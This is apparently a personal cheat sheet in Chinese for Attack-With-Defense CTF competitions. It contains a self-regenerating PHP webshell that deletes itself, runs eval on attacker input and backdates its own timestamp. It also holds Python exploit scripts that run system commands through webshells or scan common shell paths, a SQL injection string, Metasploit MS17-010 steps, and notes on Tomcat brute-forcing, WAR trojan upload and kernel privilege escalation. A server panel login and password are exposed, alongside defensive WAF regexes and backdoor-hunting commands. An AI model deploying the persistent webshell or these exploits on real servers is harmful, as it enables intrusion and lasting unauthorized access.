---
title: "msf"
date: 2026-03-21 22:58:12
categories: "awd"
tags:
  - "awd"
cover: /img/backgrounds/bg-02.png
top_img: /img/backgrounds/bg-02.png
disableNunjucks: true
---

cd /var/www/html 

tar -zcvf ~/html.tar.gz *



rm -rf /var/www/html 

tar -zxvf ~/html.tar.gz -C /var/www/html



fscan.exe -h 192.168.1.1/24

sudo nmap --script=vuln 192.168.1.9



search ms01710

use 0

set  RHOST 192.168.1.9



<font style="color:rgb(77, 77, 77);">/.test.php?pass=test</font>

<font style="color:rgb(77, 77, 77);">密码：test</font>

```python

<?php
    ignore_user_abort(true);
    set_time_limit(0);
    unlink(__FILE__);
    $file = '.test.php';
    $code = '<?php if(md5($_GET["pass"])=="098f6bcd4621d373cade4e832627b4f6"){@eval($_POST[test]);} ?>';
    while (1){
        file_put_contents($file,$code);
        system('touch -m -d "2018-12-01 09:10:12" .test.php');
        usleep(5000);
    }
?>
```



### sql注入
admin' or 1=1 #

<!-- 这是一张图片，ocr 内容为： -->
![](/assets/docs/awd/msf/img-001.png)



排查后门

find / -name "文件名包含文字*"   find / -name "php*"

find / -name '*.php

find . -name '.php' | xargs grep -n 'eval('  
find . -name '.php' | xargs grep -n 'assert('  
find . -name '*.php' | xargs grep -n 'system('



find . -name '.php' |  grep -n 'eval('



起服务器

```python
========================面板账户登录信息==========================

 【云服务器】请在安全组放行 33351 端口
 外网面板地址: http://2409:8903:6084:3440:36f6:7a27:d5e1:494c:33351/16ca9a38
 内网面板地址: http://192.168.62.106:33351/16ca9a38
 username: pcmego9i
 password: 6412a87b

 浏览器访问以下链接，添加宝塔客服
 https://www.bt.cn/new/wechat_customer
==================================================================


```

 tar -zcvf html.tar.gz html

### waf
```python
function wafrce($str){
	return !preg_match("/openlog|syslog|readlink|symlink|popepassthru|stream_socket_server|scandir|assert|pcntl_exec|fwrite|curl|system|eval|assert|flag|passthru|exec|chroot|chgrp|chown|shell_exec|proc_open|proc_get_status|popen|ini_alter|ini_restore/i", $str);
}

function wafsqli($str){
	return !preg_match("/select|and|\*|\x09|\x0a|\x0b|\x0c|\x0d|\xa0|\x00|\x26|\x7c|or|into|from|where|join|sleexml|extractvalue|+|regex|copy|read|file|create|grand|dir|insert|link|server|drop|=|>|<|;|\"|\'|\^|\|/i", $str);
}

function wafxss($str){
	return !preg_match("/\'|http|\"|\`|cookie|<|>|script/i", $str);
}

正则
		if (strpos($pic, "flag") !== false) {
			$pic = '';
		}

```



### 一句话木马利用
exp.sh

#!/bin/bash

ip=$1

port= $2

python3 ./exp.py $ip $port

```python
import sys
import requests

try:
    HOST = sys.argv[1]
    PORT = sys.argv[2]
except:
    pass

header = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/111.0"
}
url = f"http://{HOST}:{PORT}"
data = {"1": "system('cat /flag');"}

def exp_1():
    ans = requests.post(url=url, headers=header, data=data)
    print(ans.text)

exp_1() 
```

```python
import sys
import requests

try:
    HOST = sys.argv[1]
    PORT = sys.argv[2]
except:
    print("Usage: python3 exp.py <host> <port>")
    sys.exit(1)

url = f"http://{HOST}:{PORT}"

def exp_3():
    target_url = f"{url}/uploads/admin/201910/this_is_big.php"
    payload = {'x': 'cat /flag'}
    headers = {'Content-Type': 'application/x-www-form-urlencoded'}
    
    print("[*] Trying exp_3...")
    try:
        response = requests.post(target_url, headers=headers, data=payload)
        print("[+] exp_3 response:")
        print(response.text)
    except Exception as e:
        print(f"[-] exp_3 failed: {e}")

# 执行函数
exp_3()
```

```python
import sys
import requests

try:
    HOST = sys.argv[1]
    PORT = sys.argv[2]
except:
    print("Usage: python3 exp.py <host> <port>")
    sys.exit(1)

url = f"http://{HOST}:{PORT}"

def exp_4():
    print("\n[*] Trying exp_4 (GET parameter exploitation)...")
    
    # 尝试几个可能的路径
    possible_paths = [
        "/shell.php",
        "/cmd.php", 
        "/backdoor.php",
        "/uploads/shell.php",
        "/uploads/cmd.php",
        "/admin/shell.php",
        "/admin/cmd.php",
        "/inc/shell.php",
        "/tmp/shell.php",
        "/web-shell.php",
        "/x.php",
        "/a.php",
        "/"
    ]
    
    for path in possible_paths:
        target_url = f"{url}{path}"
        
        # 使用system('cat /flag')命令
        params = {'cmd': "system('cat /flag');"}
        
        try:
            print(f"[*] Testing {target_url}")
            response = requests.get(target_url, params=params, timeout=5)
            
            # 检查响应
            if response.status_code == 200 and response.text.strip():
                print(f"[+] SUCCESS with {target_url}!")
                print(f"[+] Response: {response.text.strip()}")
                return True
                
        except Exception as e:
            print(f"[-] Failed to connect to {target_url}: {e}")
    
    print("[-] exp_4 failed: No working path found")
    return False

# 执行函数
if __name__ == "__main__":
    exp_4()
```

### 打包方法
```python
cd exp/    
zip exp.zip *

    patch/    
    --patch.sh(必须)    
    --patch.py    
    --other_dependency​   

cd patch/    
zip patch.zip *​
```

### 任意文件读取
exp.sh

#!/bin/bash

ip=$1

port= $2

python3 ./exp.py $ip $port

```python
import sys
import requests

try:
    HOST = sys.argv[1]
    PORT = sys.argv[2]
except:
    pass

header = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/111.0"
}
url = f"http://{HOST}:{PORT}"

def exp_2(poc="/templates/default/common/404.php?a=system&b=cat /flag"):
    ans = requests.post(url=url+poc, headers=header, data=data)
    print(ans.text)

exp_2()
```

###  web修复
<font style="color:rgba(0, 0, 0, 0.85);">patch.sh</font>

```bash
cp -f ./index.php /var/www/html/index.php
```

```python
rm -f /var/www/html/index.php  
cp ./index.php /var/www/html/index.php
```



tomcat密码暴破序列,MSF暴破Tomcat管理后台密码

实操界面：

<!-- 这是一张图片，ocr 内容为： -->
![](/assets/docs/awd/msf/img-002.png)

** **<!-- 这是一张图片，ocr 内容为： -->
![](/assets/docs/awd/msf/img-003.png)

密码爆破成功界面展示：

<!-- 这是一张图片，ocr 内容为： -->
![](/assets/docs/awd/msf/img-004.png)

<!-- 这是一张图片，ocr 内容为： -->
![](/assets/docs/awd/msf/img-005.png)

掌握MSF利用Tomcat管理后台上传Java木马。

<!-- 这是一张图片，ocr 内容为： -->
![](/assets/docs/awd/msf/img-006.png)

<!-- 这是一张图片，ocr 内容为： -->
![](/assets/docs/awd/msf/img-007.png)

<!-- 这是一张图片，ocr 内容为： -->
![](/assets/docs/awd/msf/img-008.png)

在Kali端制作tomcat后台getshell

<!-- 这是一张图片，ocr 内容为： -->
![](/assets/docs/awd/msf/img-009.png)

向tomcat网站部署kali.war程序包

Kali端上线成功，如下图

<!-- 这是一张图片，ocr 内容为： -->
![](/assets/docs/awd/msf/img-010.png)

(5)  实施Ubuntu内核漏洞提权。

<!-- 这是一张图片，ocr 内容为： -->
![](/assets/docs/awd/msf/img-011.png)

建立反弹连接后，系统的状态 

要想获得更高的系统内操作权利，必须要提升权限！！！

编译并上传

在Kali系统内操作如下：

<!-- 这是一张图片，ocr 内容为： -->
![](/assets/docs/awd/msf/img-012.png)

<!-- 这是一张图片，ocr 内容为： -->
![](/assets/docs/awd/msf/img-013.png)

